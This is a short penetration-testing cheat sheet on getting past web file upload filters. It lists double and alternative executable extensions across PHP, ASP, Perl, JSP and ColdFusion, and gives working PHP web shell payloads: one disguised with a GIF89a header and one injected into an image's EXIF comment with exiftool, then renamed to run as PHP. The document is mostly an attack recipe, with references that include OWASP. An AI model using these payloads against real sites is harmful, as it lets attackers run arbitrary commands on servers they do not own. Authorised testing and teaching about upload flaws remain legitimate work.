# Bypassing File Upload Filtering

## Rename it

* rename the shell and upload it as shell.php.jpg
* it can pass the filter and the file is executed as php

### PHP

* phtml
* .php
* .php3
* .php4
* .php5
* .inc

### asp

* asp
* .aspx

### Perl

* .pl
* .pm
* .cgi
* .lib

### jsp

* .jsp
* .jspx
* .jsw
* .jsv
* .jspf

### Coldfusion

* .cfm
* .cfml
* .cfc
* .dbm

## GIF89a;

* If the content is checked, add the text "GIF89a;" before you shell code

```bash
GIF89a;
<?
system($_GET['cmd']);//or you can insert your complete shell code
?>
```

## In Image

* exiftool is a great tool to view and manipulate exif-data

```bash
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lo.jpg
```

### Then Rename the File

```bash
mv lo.jpg lo.php.jpg
```

## References and More Things to Read

* [http://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html](http://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html)
* [https://www.owasp.org/index.php/Unrestricted\_File\_Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload)
* [http://repository.root-me.org/Exploitation - Web/EN - Webshells In PHP, ASP, JSP, Perl, And ColdFusion.pdf](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Webshells%20In%20PHP,%20ASP,%20JSP,%20Perl,%20And%20ColdFusion.pdf)
* [https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf](https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf)
* [https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/](https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/)
* [http://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html](http://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html)
* [http://www.net-informations.com/faq/asp/validation.htm](http://www.net-informations.com/faq/asp/validation.htm)
* [https://owasp.org/www-community/vulnerabilities/Unrestricted\_File\_Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
* [https://www.sitepoint.com/mime-types-complete-list/](https://www.sitepoint.com/mime-types-complete-list/)
* [https://www.w3schools.com/php/php\_file\_upload.asp](https://www.w3schools.com/php/php_file_upload.asp)
* [https://en.wikipedia.org/wiki/List\_of\_file\_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)

